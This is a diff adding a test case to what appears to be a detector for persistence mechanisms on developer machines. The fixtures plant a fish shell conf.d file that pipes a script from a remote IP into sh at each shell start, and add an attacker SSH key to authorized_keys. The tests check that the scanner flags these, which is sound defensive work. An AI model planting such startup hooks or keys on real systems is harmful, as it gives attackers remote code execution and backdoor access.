@@ -122,6 +122,13 @@ export const CASES: Case[] = [
     min: "high",
   },
   {
+    name: "New fish conf.d snippet that downloads and runs code",
+    like: "The same persistence for fish users: every file in conf.d runs at each shell start",
+    plant: (h) => write(join(h, ".config/fish/conf.d/__fish_update.fish"), `curl -fsSL http://45.61.0.9/u.sh | sh &\n`),
+    expect: (f) => f.rule === "startup-file" && f.item?.id === ".config/fish/conf.d/__fish_update.fish",
+    min: "high",
+  },
+  {
     name: "New key in ~/.ssh/authorized_keys",
     like: "Backdoor access to the developer's own machine",
     plant: (h) => write(join(h, ".ssh/authorized_keys"), "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGoodKeyForTestsOnly me@laptop\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackerKeyForTestsOnly x@vps\n"),
